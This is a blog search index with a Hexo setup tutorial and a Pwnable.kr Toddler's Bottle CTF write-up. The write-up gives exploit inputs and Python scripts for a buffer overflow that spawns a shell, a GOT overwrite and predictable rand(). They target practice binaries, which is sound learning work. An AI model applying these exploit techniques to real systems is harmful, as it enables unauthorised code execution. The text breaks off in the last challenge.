[{"title":"Hexo 博客搭建","url":"/applications/hexo/hexo-%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/","content":"Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他标记语言）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。\n\n\n安装应用Hexo 基于 Node.js 开发，需要以下工具支撑运行。\n\nNode.js (Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)\nGit\n\n通过 npm 安装 Hexo 应用。\nnpm install -g hexo-cli\n\n创建博客新建任意目录，作为 Hexo 博客的根目录。\nmkdir test-blog\n\n初始化 Hexo 博客，新建和下载所需要的文件。\ncd test-bloghexo init\n\n完成之后，目录的基本结构如下所示。\n.├── _config.yml├── package.json├── scaffolds├── source|   ├── _drafts|   └── _posts└── themes\n\n启动 Node.js 内置的服务器，在本地预览博客。\nhexo clean      # 清除缓存文件和已生成的静态文件hexo generate   # 可以缩写成hexo g，生成静态文件。hexo server     # 可以缩写成hexo d，启动服务器。\n\n默认情况下，通过 http://localhost:4000 访问博客。\n\n配置博客Hexo 博客的一些基础配置。\n博客主题基于 Next 主题进行配置。\n在博客根目录下载 Next 主题。\ngit clone https://github.com/next-theme/hexo-theme-next themes/next\n\n将博客主题配置文件复制到博客根目录。\ncp themes/next/_config.yml ./_config.next.yml\n\n编辑 _config.yml 配置文件。\n# Extensions## Plugins: https://hexo.io/plugins/## Themes: https://hexo.io/themes/theme: next\n\n分类页面在博客根目录执行新建页面命令。\nhexo new page categories\n\n打开 source/categories/index.md 文件，在顶部的 YAML 代码块中配置以下内容。\ntitle: 分类date: 2025-10-22 15:30:18type: &quot;categories&quot;\n\n以 Next 主题为例，编辑 _config.next.yml 文件，启用分类页面显示。\n# Usage: `Key: /link/ || icon`# Key is the name of menu item. If the translation for this item is available, the translated text will be loaded, otherwise the Key name will be used. Key is case-sensitive.# Value before `||` delimiter is the target link, value after `||` delimiter is the name of Font Awesome icon.# External url should start with http:// or https://menu:  home: / || fa fa-home  #about: /about/ || fa fa-user  #tags: /tags/ || fa fa-tags  categories: /categories/ || fa fa-th  #archives: /archives/ || fa fa-archive  #schedule: /schedule/ || fa fa-calendar  #sitemap: /sitemap.xml || fa fa-sitemap  #commonweal: /404/ || fa fa-heartbeat\n\n标签页面在博客根目录执行新建页面命令。\nhexo new page tags\n\n打开 source/tags/index.md 文件，在顶部的 YAML 代码块中配置以下内容。\ntitle: 标签date: 2025-10-22 15:30:23type: &quot;tags&quot;\n\n以 Next 主题为例，编辑 _config.next.yml 文件，启用标签页面显示。\n# Usage: `Key: /link/ || icon`# Key is the name of menu item. If the translation for this item is available, the translated text will be loaded, otherwise the Key name will be used. Key is case-sensitive.# Value before `||` delimiter is the target link, value after `||` delimiter is the name of Font Awesome icon.# External url should start with http:// or https://menu:  home: / || fa fa-home  #about: /about/ || fa fa-user  tags: /tags/ || fa fa-tags  #categories: /categories/ || fa fa-th  #archives: /archives/ || fa fa-archive  #schedule: /schedule/ || fa fa-calendar  #sitemap: /sitemap.xml || fa fa-sitemap  #commonweal: /404/ || fa fa-heartbeat\n\n内容搜索使用 npm 安装 hexo-generator-searchdb 模块。\nnpm install hexo-generator-searchdb\n\n以 Next 主题为例，编辑 _config.next.yml 文件，启动本地搜索模块。\n# Local Search# Dependencies: https://github.com/next-theme/hexo-generator-searchdblocal_search:  enable: true  # Show top n results per article, show all results by setting to -1  top_n_per_article: 1  # Unescape html strings to the readable one.  unescape: false  # Preload the search data when the page loads.  preload: false\n\n编辑 _config.yml 文件，新增以下配置。\n# Search## Local Searchsearch:  path: search.json  field: post  content: true  format: striptags\n\n图片引用默认情况下，可以直接使用 MarkDown 语法在文章中引用本地或者图床中的图片。\n![This is an example image](/images/example.png)![This is an example image](https://xxx.xxx.com/images/example.png)\n\n对于本地图片资源，为了便于组织和管理，可以启用资源目录，将图片与文章放置在一起，通过相对路径进行引用。\n# _config.ymlpost_asset_folder: true\n\n文章与图片的目录结构如下，每篇文章对应一个同名的资源目录。\n_post├── example.md└── example\t└── example.png\n\n使用 MarkDown 语法或者标签插件提供的语法在文章中引用图片。\n![This is an example image](example/example.png)&#123;% asset_img example.png This is an example image %&#125;\n\n在 hexo-renderer-marked 3.1.0 中，引入了新的配置选项，用于简化 MarkDown 引用图片的语句。\n# _config.ymlpost_asset_folder: truemarked:  prependRoot: false  postAsset: true\n\n使用简化的 MarkDown 语法在文章中引用本地图片。\n![This is an example image](example.png)\n\n部署博客Hexo 提供了快速部署功能，可以将博客快速部署到指定服务器。\nGitHub在 GitHub 中新建公共仓库，仓库名必须为 &lt;GitHub用户名&gt;.github.io 格式。\n本地配置 Git 用户信息，并生成 SSH 密钥对。\ngit config --global user.name &quot;&lt;用户名称&gt;&quot;git config --global user.email &quot;&lt;用户邮箱&gt;&quot;ssh-keygen -t rsa -C &quot;&lt;用户邮箱&gt;&quot;\n\n复制 ~/.ssh 目录下 id_rsa.pub 文件中的 SSH 公钥信息，将其添加到 GitHub 设置中。\n\n安装 hexo-deployer-git 插件。\nnpm install hexo-deployer-git --save\n\n编辑 _config.yml 配置文件，修改部署配置。\n# Deployment## Docs: https://hexo.io/docs/one-command-deploymentdeploy:  type: git  repo: git@github.com:&lt;GitHub用户名&gt;/GitHub用户名&gt;.github.io.git  branch: main\n\n将博客部署到 GitHub 仓库。\nhexo d\n\n等待一段时间后，可以通过 https://&lt;GitHub用户名&gt;.github.io 访问博客。\n参考链接文档 | Hexo\n","categories":["工具应用","Hexo"],"tags":["Hexo"]},{"title":"Pwnable.kr Toddler's Bottle 练习记录","url":"/cybersecurity/ctf/pwnable-kr/pwnable-kr-toddler-s-bottle-%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/","content":"Pwnable.kr Toddler&#39;s Bottle 练习记录。\n\n\nfd查看程序源码，需要使 buf 为 &quot;LETMEWIN&quot; 字符串才可以得到 flag 信息。\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123;\tif(argc&lt;2)&#123;\t\tprintf(&quot;pass argv[1] a number\\n&quot;);\t\treturn 0;\t&#125;\tint fd = atoi( argv[1] ) - 0x1234;\tint len = 0;\tlen = read(fd, buf, 32);\tif(!strcmp(&quot;LETMEWIN\\n&quot;, buf))&#123;\t\tprintf(&quot;good job :)\\n&quot;);\t\tsetregid(getegid(), getegid());\t\tsystem(&quot;/bin/cat flag&quot;);\t\texit(0);\t&#125;\tprintf(&quot;learn about Linux file IO\\n&quot;);\treturn 0;&#125;\n\n在 Linux 系统中，文件描述符使用 int 类型进行表示，其中有三个系统默认值。\n\n0：stdin，标准输入流\n1：stdout，标准输出流\n2：stderr，标准错误流\n\n当程序中 fd 的值为 0 时，表示 read() 函数将从 stdin 流中读取 32 字节数据到 buf 数组中，此时可以控制 buf 为 &quot;LETMEWIN&quot; 字符串，得到 flag 信息。\nfd@ubuntu:~$ ./fd 4660LETMEWINgood job :)Mama! Now_I_understand_what_file_descriptors_are!\n\ncollision查看程序源码，当输入的字符相加为 0x21DD09EC 时，得到 flag 信息。\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123;\tint* ip = (int*)p;\tint i;\tint res=0;\tfor(i=0; i&lt;5; i++)&#123;\t\tres += ip[i];\t&#125;\treturn res;&#125;int main(int argc, char* argv[])&#123;\tif(argc&lt;2)&#123;\t\tprintf(&quot;usage : %s [passcode]\\n&quot;, argv[0]);\t\treturn 0;\t&#125;\tif(strlen(argv[1]) != 20)&#123;\t\tprintf(&quot;passcode length should be 20 bytes\\n&quot;);\t\treturn 0;\t&#125;\tif(hashcode == check_password( argv[1] ))&#123;\t\tsetregid(getegid(), getegid());\t\tsystem(&quot;/bin/cat flag&quot;);\t\treturn 0;\t&#125;\telse\t\tprintf(&quot;wrong passcode.\\n&quot;);\treturn 0;&#125;\n\n由 0x21DD09EC 为 568134124 可知，当 0x21DD09EC + 0x1 &#x3D; 0x21DD09ED 时，能够被 5 除尽，所以可以得到 0x6C5CEC9、0x6C5CEC9、0x6C5CEC9、0x6C5CEC9 和 0x6C5CEC8 等 5 个用于相加的数值。\n构造用于输入的字符串，读取 flag 信息。\ncol@ubuntu:~$ ./col `python2 -c &#x27;print &quot;\\xC9\\xCE\\xC5\\x06\\xC9\\xCE\\xC5\\x06\\xC9\\xCE\\xC5\\x06\\xC9\\xCE\\xC5\\x06\\xC8\\xCE\\xC5\\x06&quot;&#x27;`Two_hash_collision_Nicely\n\nbof查看程序源码，当 key 为 0xcafebabe 时，得到 flag 信息。\n#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123;\tchar overflowme[32];\tprintf(&quot;overflow me : &quot;);\tgets(overflowme);\t// smash me!\tif(key == 0xcafebabe)&#123;\t\tsetregid(getegid(), getegid());\t\tsystem(&quot;/bin/sh&quot;);\t&#125;\telse&#123;\t\tprintf(&quot;Nah..\\n&quot;);\t&#125;&#125;int main(int argc, char* argv[])&#123;\tfunc(0xdeadbeef);\treturn 0;&#125;\n\n通过 gets() 函数获取输入时，并不会对输入数据的长度进行检查，因此输入长度超过 32 字节便会溢出 overflowme 数组的内存空间。\n查看 func 函数的栈布局。\n-000000000000002C     char overflowme[32];-000000000000000C     _DWORD var_C;-0000000000000008     // padding byte-0000000000000007     // padding byte-0000000000000006     // padding byte-0000000000000005     // padding byte-0000000000000004     // padding byte-0000000000000003     // padding byte-0000000000000002     // padding byte-0000000000000001     // padding byte+0000000000000000     _DWORD __saved_registers;+0000000000000004     _UNKNOWN *__return_address;+0000000000000008     _DWORD key;\n\n其中 overflowme 距离 key 偏移为 0x34 字节，当填充 56 字节的数据时，便可以覆盖 key 的值。\n在题目服务器的 /tmp 目录中新建任意目录，创建 Python 脚本文件，内容如下。\n#!/usr/bin/python3from pwn import *payload = b&#x27;A&#x27; * 0x34payload += b&#x27;\\xbe\\xba\\xfe\\xca&#x27;target = remote(&#x27;0.0.0.0&#x27;, 9000)target.sendline(payload)target.interactive()\n\n运行脚本，得到 flag 信息。\nbof@ubuntu:/tmp/bof_test$ python3 get_flag.py[+] Opening connection to 0.0.0.0 on port 9000: Done[*] Switching to interactive mode$ lsbofbof.cflaglogsuper.pl$ cat flagDaddy_I_just_pwned_a_buff3r!$\n\npasscode查看程序源码，当 passcode1 为 123456 和 passcode2 为 13371337 时得到 flag 信息。\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void login()&#123;\tint passcode1;\tint passcode2;\tprintf(&quot;enter passcode1 : &quot;);\tscanf(&quot;%d&quot;, passcode1);\tfflush(stdin);\t// ha! mommy told me that 32bit is vulnerable to bruteforcing :)\tprintf(&quot;enter passcode2 : &quot;);        scanf(&quot;%d&quot;, passcode2);\tprintf(&quot;checking...\\n&quot;);\tif(passcode1==123456 &amp;&amp; passcode2==13371337)&#123;                printf(&quot;Login OK!\\n&quot;);\t\tsetregid(getegid(), getegid());                system(&quot;/bin/cat flag&quot;);        &#125;        else&#123;                printf(&quot;Login Failed!\\n&quot;);\t\texit(0);        &#125;&#125;void welcome()&#123;\tchar name[100];\tprintf(&quot;enter you name : &quot;);\tscanf(&quot;%100s&quot;, name);\tprintf(&quot;Welcome %s!\\n&quot;, name);&#125;int main()&#123;\tprintf(&quot;Toddler&#x27;s Secure Login System 1.1 beta.\\n&quot;);\twelcome();\tlogin();\t// something after login...\tprintf(&quot;Now I can safely trust you that you have credential :)\\n&quot;);\treturn 0;\t&#125;\n\n在 login() 函数中，可以看到 passcode1 和 passcode2 通过 scanf() 函数接收输入时，缺少 &amp; 符号，这将导致实际存储数据的内存地址由两个变量的数值决定。\n经过调试分析发现 welcome() 函数中 name 数组的最后 4 个字节，恰好与 passcode1 重叠，因此可以通过 name 数组来控制 passcode1 的值，从而实现任意地址写入。\n// eax = 0xffffd098 -&gt; name array address*EAX  0xffffd098 ◂— 0x28 /* &#x27;(&#x27; */   0x804931e &lt;welcome+44&gt;    add    esp, 0x10   0x8049321 &lt;welcome+47&gt;    sub    esp, 8   0x8049324 &lt;welcome+50&gt;    lea    eax, [ebp - 0x70] ► 0x8049327 &lt;welcome+53&gt;    push   eax   0x8049328 &lt;welcome+54&gt;    lea    eax, [ebx - 0x1f8b]   0x804932e &lt;welcome+60&gt;    push   eax   0x804932f &lt;welcome+61&gt;    call   __isoc99_scanf@plt          &lt;__isoc99_scanf@plt&gt;      // ebp - 0x10 = 0xffffd0f8 -&gt; passcode1 address EBP  0xffffd108 —▸ 0xffffd118 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0   0x8049218 &lt;login+34&gt;    add    esp, 0x10   0x804921b &lt;login+37&gt;    sub    esp, 8 ► 0x804921e &lt;login+40&gt;    push   dword ptr [ebp - 0x10]   0x8049221 &lt;login+43&gt;    lea    eax, [ebx - 0x1fe5]   0x8049227 &lt;login+49&gt;    push   eax   0x8049228 &lt;login+50&gt;    call   __isoc99_scanf@plt          &lt;__isoc99_scanf@plt&gt; // ebp - 0xc = 0xffffd0fc -&gt; passcode2 address EBP  0xffffd108 —▸ 0xffffd118 ◂— 0x1e240     0x8049253 &lt;login+93&gt;     add    esp, 0x10   0x8049256 &lt;login+96&gt;     sub    esp, 8 ► 0x8049259 &lt;login+99&gt;     push   dword ptr [ebp - 0xc]   0x804925c &lt;login+102&gt;    lea    eax, [ebx - 0x1fe5]   0x8049262 &lt;login+108&gt;    push   eax   0x8049263 &lt;login+109&gt;    call   __isoc99_scanf@plt          &lt;__isoc99_scanf@plt&gt;\n\n借助任意地址写入功能，可以通过改写 GOT 表中的函数地址来跳转到任意地址进行执行，从而绕过校验代码，得到 flag 信息。\n查看 .got.plt 中的函数列表。\npasscode@ubuntu:~$ readelf -r passcodeRelocation section &#x27;.rel.dyn&#x27; at offset 0x430 contains 2 entries: Offset     Info    Type            Sym.Value  Sym. Name0804bff8  00000806 R_386_GLOB_DAT    00000000   __gmon_start__0804bffc  00000a06 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0Relocation section &#x27;.rel.plt&#x27; at offset 0x440 contains 10 entries: Offset     Info    Type            Sym.Value  Sym. Name0804c00c  00000107 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.340804c010  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.00804c014  00000307 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.00804c018  00000407 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.40804c01c  00000507 R_386_JUMP_SLOT   00000000   getegid@GLIBC_2.00804c020  00000607 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.00804c024  00000707 R_386_JUMP_SLOT   00000000   system@GLIBC_2.00804c028  00000907 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.00804c02c  00000b07 R_386_JUMP_SLOT   00000000   setregid@GLIBC_2.00804c030  00000c07 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7\n\n由于 fflush() 函数会刷新输入缓冲区，所以选择覆盖 GOT 表中 fflush() 函数的地址。\n通过 fflush() 函数直接跳转到校验成功分支。\n.text:0804928F                 sub     esp, 0Ch.text:08049292                 lea     eax, (aLoginOk - 804C000h)[ebx] ; &quot;Login OK!&quot;.text:08049298                 push    eax             ; s.text:08049299                 call    _puts.text:0804929E                 add     esp, 10h.text:080492A1                 call    _getegid.text:080492A6                 mov     esi, eax.text:080492A8                 call    _getegid.text:080492AD                 sub     esp, 8.text:080492B0                 push    esi             ; egid.text:080492B1                 push    eax             ; rgid.text:080492B2                 call    _setregid.text:080492B7                 add     esp, 10h.text:080492BA                 sub     esp, 0Ch.text:080492BD                 lea     eax, (aBinCatFlag - 804C000h)[ebx] ; &quot;/bin/cat flag&quot;.text:080492C3                 push    eax             ; command.text:080492C4                 call    _system.text:080492C9                 add     esp, 10h.text:080492CC                 jmp     short loc_80492EA\n\n借助 Python 向程序传参，得到 flag 信息。\npasscode@ubuntu:~$ python2 -c &#x27;print &quot;a&quot; * 96 + &quot;\\x14\\xc0\\x04\\x08&quot; + &quot;134517409&quot;&#x27; | ./passcodeToddler&#x27;s Secure Login System 1.1 beta.enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!s0rry_mom_I_just_ign0red_c0mp1ler_w4rningenter passcode1 : Now I can safely trust you that you have credential :)\n\nrandom查看程序源码，当输入数据与随机数异或结果为 0xcafebabe 时，得到 flag 信息。\n#include &lt;stdio.h&gt;int main()&#123;\tunsigned int random;\trandom = rand();\t// random value!\tunsigned int key=0;\tscanf(&quot;%d&quot;, &amp;key);\tif( (key ^ random) == 0xcafebabe )&#123;\t\tprintf(&quot;Good!\\n&quot;);\t\tsetregid(getegid(), getegid());\t\tsystem(&quot;/bin/cat flag&quot;);\t\treturn 0;\t&#125;\tprintf(&quot;Wrong, maybe you should try 2^32 cases.\\n&quot;);\treturn 0;&#125;\n\n由于程序在调用 rand() 函数之前，未调用 srand() 函数初始化随机数种子，因此系统会默认以 1 为种子生成随机数，这将导致每次运行程序生成的随机数均相同。\n本地调试程序，得到生成的随机数 0x6b8b4567。\n*RAX  0x6b8b4567   0x555555555216 &lt;main+13&gt;    mov    rax, qword ptr fs:[0x28]   0x55555555521f &lt;main+22&gt;    mov    qword ptr [rbp - 0x18], rax   0x555555555223 &lt;main+26&gt;    xor    eax, eax   0x555555555225 &lt;main+28&gt;    mov    eax, 0   0x55555555522a &lt;main+33&gt;    call   rand@plt                    &lt;rand@plt&gt;  ► 0x55555555522f &lt;main+38&gt;    mov    dword ptr [rbp - 0x1c], eax\n\n异或计算得到正确的 key 值为 0xa175ffd9，即十进制 2708864985。\n运行程序，得到 flag 信息。\nrandom@ubuntu:~$ ./random2708864985Good!m0mmy_I_can_predict_rand0m_v4lue!\n\ninput2查看程序源码，需要满足五个条件才能得到 flag 信息。\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;sys/socket.h&gt;#include &lt;arpa/inet.h&gt;int main(int argc, char* argv[], char* envp[])&#123;\tprintf(&quot;Welcome to pwnable.kr\\n&quot;);\tprintf(&quot;Let&#x27;s see if you know how to give input to program\\n&quot;);\tprintf(&quot;Just give me correct inputs then you will get the flag :)\\n&quot;);\t// argv\tif(argc != 100) return 0;\tif(strcmp(argv[&#x27;A&#x27;],&quot;\\x00&quot;)) return 0;\tif(strcmp(argv[&#x27;B&#x27;],&quot;\\x20\\x0a\\x0d&quot;)) return 0;\tprintf(&quot;Stage 1 clear!\\n&quot;);\t\t// stdio\tchar buf[4];\tread(0, buf, 4);\tif(memcmp(buf, &quot;\\x00\\x0a\\x00\\xff&quot;, 4)) return 0;\tread(2, buf, 4);        if(memcmp(buf, &quot;\\x00\\x0a\\x02\\xff&quot;, 4)) return 0;\tprintf(&quot;Stage 2 clear!\\n&quot;);\t\t// env\tif(strcmp(&quot;\\xca\\xfe\\xba\\xbe&quot;, getenv(&quot;\\xde\\xad\\xbe\\xef&quot;))) return 0;\tprintf(&quot;Stage 3 clear!\\n&quot;);\t// file\tFILE* fp = fopen(&quot;\\x0a&quot;, &quot;r&quot;);\tif(!fp) return 0;\tif( fread(buf, 4, 1, fp)!=1 ) return 0;\tif( memcmp(buf, &quot;\\x00\\x00\\x00\\x00&quot;, 4) ) return 0;\tfclose(fp);\tprintf(&quot;Stage 4 clear!\\n&quot;);\t\t// network\tint sd, cd;\tstruct sockaddr_in saddr, caddr;\tsd = socket(AF_INET, SOCK_STREAM, 0);\tif(sd == -1)&#123;\t\tprintf(&quot;socket error, tell admin\\n&quot;);\t\treturn 0;\t&#125;\tsaddr.sin_family = AF_INET;\tsaddr.sin_addr.s_addr = INADDR_ANY;\tsaddr.sin_port = htons( atoi(argv[&#x27;C&#x27;]) );\tif(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;\t\tprintf(&quot;bind error, use another port\\n&quot;);    \t\treturn 1;\t&#125;\tlisten(sd, 1);\tint c = sizeof(struct sockaddr_in);\tcd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);\tif(cd &lt; 0)&#123;\t\tprintf(&quot;accept error, tell admin\\n&quot;);\t\treturn 0;\t&#125;\tif( recv(cd, buf, 4, 0) != 4 ) return 0;\tif(memcmp(buf, &quot;\\xde\\xad\\xbe\\xef&quot;, 4)) return 0;\tprintf(&quot;Stage 5 clear!\\n&quot;);\t// here&#x27;s your flag\tsetregid(getegid(), getegid());\tsystem(&quot;/bin/cat flag&quot;);\t\treturn 0;&#125;\n\n第一个条件，通过 Shell 传递 100 个参数，且第 A (65) 个参数为 \\x00，第 B (66) 个参数为 \\x20\\x0a\\x0d。\n// argvif(argc != 100) return 0;if(strcmp(argv[&#x27;A&#x27;],&quot;\\x00&quot;)) return 0;if(strcmp(argv[&#x27;B&#x27;],&quot;\\x20\\x0a\\x0d&quot;)) return 0;printf(&quot;Stage 1 clear!\\n&quot;);\t\n\n第二个条件，向 stdio 中写入 \\x00\\x0a\\x00\\xff，向 stderr 中写入 \\x00\\x0a\\x02\\xff。\n// stdiochar buf[4];read(0, buf, 4);if(memcmp(buf, &quot;\\x00\\x0a\\x00\\xff&quot;, 4)) return 0;read(2, buf, 4);       if(memcmp(buf, &quot;\\x00\\x0a\\x02\\xff&quot;, 4)) return 0;printf(&quot;Stage 2 clear!\\n&quot;);\n\n第三个条件，新增 \\xde\\xad\\xbe\\xef 环境变量，设置值为 \\xca\\xfe\\xba\\xbe。\n// envif(strcmp(&quot;\\xca\\xfe\\xba\\xbe&quot;, getenv(&quot;\\xde\\xad\\xbe\\xef&quot;))) return 0;printf(&quot;Stage 3 clear!\\n&quot;);\n\n第四个条件，新建 \\x0a 文件，内容为 \\x00\\x00\\x00\\x00。\n// fileFILE* fp = fopen(&quot;\\x0a&quot;, &quot;r&quot;);if(!fp) return 0;if( fread(buf, 4, 1, fp)!=1 ) return 0;if( memcmp(buf, &quot;\\x00\\x00\\x00\\x00&quot;, 4) ) return 0;fclose(fp);printf(&quot;Stage 4 clear!\\n&quot;);\t\n\n第五个条件，通过 Shell 第 C (67) 个参数指定监听端口，建立连接发送 \\xde\\xad\\xbe\\xef 数据。\n// networkint sd, cd;struct sockaddr_in saddr, caddr;sd = socket(AF_INET, SOCK_STREAM, 0);if(sd == -1)&#123;\tprintf(&quot;socket error, tell admin\\n&quot;);\treturn 0;&#125;saddr.sin_family = AF_INET;saddr.sin_addr.s_addr = INADDR_ANY;saddr.sin_port = htons( atoi(argv[&#x27;C&#x27;]) );if(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0)&#123;\tprintf(&quot;bind error, use another port\\n&quot;);   \t\treturn 1;&#125;listen(sd, 1);int c = sizeof(struct sockaddr_in);cd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c);if(cd &lt; 0)&#123;\tprintf(&quot;accept error, tell admin\\n&quot;);\treturn 0;&#125;if( recv(cd, buf, 4, 0) != 4 ) return 0;if(memcmp(buf, &quot;\\xde\\xad\\xbe\\xef&quot;, 4)) return 0;printf(&quot;Stage 5 clear!\\n&quot;);\n\n根据条件，编写利用脚本。\n#!/usr/bin/python3import osimport timeimport socketimport subprocessport = 10000if __name__ == &quot;__main__&quot;:    args = list(&quot;A&quot; * 100)    args[0] = &quot;/home/input2/input2&quot;    args[ord(&#x27;A&#x27;)] = &quot;&quot;    args[ord(&#x27;B&#x27;)] = &quot;\\x20\\x0a\\x0d&quot;    args[ord(&#x27;C&#x27;)] = str(port)    stdinr, stdinw = os.pipe()    stderrr, stderrw = os.pipe()    os.write(stdinw, b&quot;\\x00\\x0a\\x00\\xff&quot;)    os.write(stderrw, b&quot;\\x00\\x0a\\x02\\xff&quot;)    environ = &#123;b&quot;\\xde\\xad\\xbe\\xef&quot;: b&quot;\\xca\\xfe\\xba\\xbe&quot;&#125;    f = open(&quot;\\x0a&quot;, &quot;w+&quot;)    f.write(&quot;\\x00\\x00\\x00\\x00&quot;)    f.close()    target = subprocess.Popen(args, stdin=stdinr, stderr=stderrr, env=environ)    time.sleep(2)    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    server.connect((&quot;127.0.0.1&quot;, port))    server.send(b&quot;\\xde\\xad\\xbe\\xef&quot;)    server.close()\n\n将脚本上传到服务器 /tmp 下新建的目录中，并通过软链接引用 flag 文件。\nln -s /home/input2/flag ./flag\n\n运行脚本，获取 flag 信息。\ninput2@ubuntu:/tmp/input2_test$ python3 get_flag.pyWelcome to pwnable.krLet&#x27;s see if you know how to give input to programJust give me correct inputs then you will get the flag :)Stage 1 clear!Stage 2 clear!Stage 3 clear!Stage 4 clear!Stage 5 clear!Mommy_now_I_know_how_to_pa5s_inputs_in_Linux\n\nleg查看程序源码，需要计算出三个正确的 key 值才能得到 flag 信息。\n#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;int key1()&#123;\tasm(&quot;mov r3, pc\\n&quot;);&#125;int key2()&#123;\tasm(\t&quot;push\t&#123;r6&#125;\\n&quot;\t&quot;add\tr6, pc, $1\\n&quot;\t&quot;bx\tr6\\n&quot;\t&quot;.code   16\\n&quot;\t&quot;mov\tr3, pc\\n&quot;\t&quot;add\tr3, $0x4\\n&quot;\t&quot;push\t&#123;r3&#125;\\n&quot;\t&quot;pop\t&#123;pc&#125;\\n&quot;\t&quot;.code\t32\\n&quot;\t&quot;pop\t&#123;r6&#125;\\n&quot;\t);&#125;int key3()&#123;\tasm(&quot;mov r3, lr\\n&quot;);&#125;int main()&#123;\tint key=0;\tprintf(&quot;Daddy has very strong arm! : &quot;);\tscanf(&quot;%d&quot;, &amp;key);\tif( (key1()+key2()+key3()) == key )&#123;\t\tprintf(&quot;Congratz!\\n&quot;);\t\tint fd = open(&quot;flag&quot;, O_RDONLY);\t\tchar buf[100];\t\tint r = read(fd, buf, 100);\t\twrite(0, buf, r);\t&#125;\telse&#123;\t\tprintf(&quot;I have strong leg :P\\n&quot;);\t&#125;\treturn 0;&#125;\n\n根据题目给出的调试信息，分析三个 key 函数的返回值。\n查看 key1() 函数的汇编代码。\n(gdb) disass key1Dump of assembler code for function key1:   0x00008cd4 &lt;+0&gt;:\tpush\t&#123;r11&#125;\t\t; (str r11, [sp, #-4]!)   0x00008cd8 &lt;+4&gt;:\tadd\tr11, sp, #0   0x00008cdc &lt;+8&gt;:\tmov\tr3, pc   0x00008ce0 &lt;+12&gt;:\tmov\tr0, r3   0x00008ce4 &lt;+16&gt;:\tsub\tsp, r11, #0   0x00008ce8 &lt;+20&gt;:\tpop\t&#123;r11&#125;\t\t; (ldr r11, [sp], #4)   0x00008cec &lt;+24&gt;:\tbx\tlrEnd of assembler dump.\n\n根据 Arm 架构的三级流水线特性，当 0x00008cdc 处的指令执行时，寄存器 pc 中的值为 0x00008ce4，所以 key1() 函数的返回值为 0x00008ce4。\n查看 key2() 函数的汇编代码。\n(gdb) disass key2Dump of assembler code for function key2:   0x00008cf0 &lt;+0&gt;:\tpush\t&#123;r11&#125;\t\t; (str r11, [sp, #-4]!)   0x00008cf4 &lt;+4&gt;:\tadd\tr11, sp, #0   0x00008cf8 &lt;+8&gt;:\tpush\t&#123;r6&#125;\t\t; (str r6, [sp, #-4]!)   0x00008cfc &lt;+12&gt;:\tadd\tr6, pc, #1   0x00008d00 &lt;+16&gt;:\tbx\tr6   0x00008d04 &lt;+20&gt;:\tmov\tr3, pc   0x00008d06 &lt;+22&gt;:\tadds\tr3, #4   0x00008d08 &lt;+24&gt;:\tpush\t&#123;r3&#125;   0x00008d0a &lt;+26&gt;:\tpop\t&#123;pc&#125;   0x00008d0c &lt;+28&gt;:\tpop\t&#123;r6&#125;\t\t; (ldr r6, [sp], #4)   0x00008d10 &lt;+32&gt;:\tmov\tr0, r3   0x00008d14 &lt;+36&gt;:\tsub\tsp, r11, #0   0x00008d18 &lt;+40&gt;:\tpop\t&#123;r11&#125;\t\t; (ldr r11, [sp], #4)   0x00008d1c &lt;+44&gt;:\tbx\tlrEnd of assembler dump.\n\n根据 Arm 架构的状态变换特性，当 0x00008d04 处指令执行时，寄存器 pc 的值为 0x00008d04，因此 key2() 函数的返回值为 0x00008d0c。\n查看 main() 和 key3() 函数的汇编代码。\n(gdb) disass mainDump of assembler code for function main:   ....   0x00008d7c &lt;+64&gt;:\tbl\t0x8d20 &lt;key3&gt;   0x00008d80 &lt;+68&gt;:\tmov\tr3, r0   0x00008d84 &lt;+72&gt;:\tadd\tr2, r4, r3   0x00008d88 &lt;+76&gt;:\tldr\tr3, [r11, #-16]   ....End of assembler dump.\n\n(gdb) disass key3Dump of assembler code for function key3:   0x00008d20 &lt;+0&gt;:\tpush\t&#123;r11&#125;\t\t; (str r11, [sp, #-4]!)   0x00008d24 &lt;+4&gt;:\tadd\tr11, sp, #0   0x00008d28 &lt;+8&gt;:\tmov\tr3, lr   0x00008d2c &lt;+12&gt;:\tmov\tr0, r3   0x00008d30 &lt;+16&gt;:\tsub\tsp, r11, #0   0x00008d34 &lt;+20&gt;:\tpop\t&#123;r11&#125;\t\t; (ldr r11, [sp], #4)   0x00008d38 &lt;+24&gt;:\tbx\tlrEnd of assembler dump.\n\n根据 Arm 架构的函数调用特性，寄存器 lr 保存着 key3() 函数的返回地址，因此 key3() 函数的返回值为 0x00008d80。\n将三个返回值相加，计算出 key 值为 0x0001A770，得到 flag 信息。\n/ $ ./legDaddy has very strong arm! : 